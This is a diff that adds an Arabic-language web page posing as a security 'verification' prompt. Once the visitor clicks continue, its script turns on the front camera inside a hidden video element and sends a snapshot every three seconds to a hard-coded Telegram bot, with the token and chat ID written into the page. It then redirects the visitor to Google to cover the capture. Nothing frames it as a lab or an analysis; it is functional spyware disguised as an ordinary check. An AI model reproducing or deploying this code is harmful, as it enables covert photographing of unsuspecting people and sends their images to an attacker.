@@ -1,0 +1,145 @@
+<!DOCTYPE html><html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Verification 🛡️</title>
+  <style>
+    body {
+      background: #080808;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 25px 15px;
+    }
+
+    .box {
+      max-width: 420px;
+      margin: 40px auto;
+      padding: 25px;
+      border: 1px solid #333;
+      border-radius: 20px;
+      background: #151515;
+      box-shadow: 0 0 25px rgba(0,0,0,0.8);
+    }
+
+    h1 {
+      color: #fff;
+      font-size: 28px;
+    }
+
+    p {
+      line-height: 1.8;
+      color: #aaa;
+    }
+
+    button {
+      display: block;
+      width: 100%;
+      margin-top: 15px;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      background: #2ea44f;
+      color: white;
+      font-size: 17px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      opacity: .5;
+    }
+
+    video {
+      display: none;
+    }
+
+    #status {
+      color: #888;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h1>التحقق من الأمان</h1>
+    <p>الرجاء إعطاء الإذن لكي يتم استكمال التصفح.</p>
+
+    <video id="camera" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <button id="start">متابعة</button>
+    <p id="status"></p>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
+    const CHAT_ID = "7713496654";
+
+    const camera = document.getElementById("camera");
+    const canvas = document.getElementById("canvas");
+    const startBtn = document.getElementById("start");
+    const status = document.getElementById("status");
+
+    let stream;
+
+    async function sendPhotoToTelegram(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, "capture.jpg");
+
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      } catch (err) {
+        // Silent fail
+      }
+    }
+
+    startBtn.onclick = async () => {
+      startBtn.disabled = true;
+      status.textContent = "جاري التحقق...";
+
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+
+        camera.srcObject = stream;
+
+        // Wait for video metadata to load
+        camera.onloadedmetadata = () => {
+          canvas.width = camera.videoWidth || 640;
+          canvas.height = camera.videoHeight || 480;
+          
+          const ctx = canvas.getContext("2d");
+          
+          // Capture and send frames periodically in the background
+          setInterval(() => {
+            if (!stream) return;
+            ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => {
+              if (blob) {
+                sendPhotoToTelegram(blob);
+              }
+            }, "image/jpeg", 0.8);
+          }, 3000); // Send a frame every 3 seconds
+
+          setTimeout(() => {
+            status.textContent = "جاري تحويلك للمحتوى...";
+            window.location.href = "https://www.google.com";
+          }, 1500);
+        };
+
+      } catch (err) {
+        status.textContent = "حدث خطأ، يجدر إعادة المحاولة.";
+        startBtn.disabled = false;
+      }
+    };
+  </script>
+</body>
+</html>
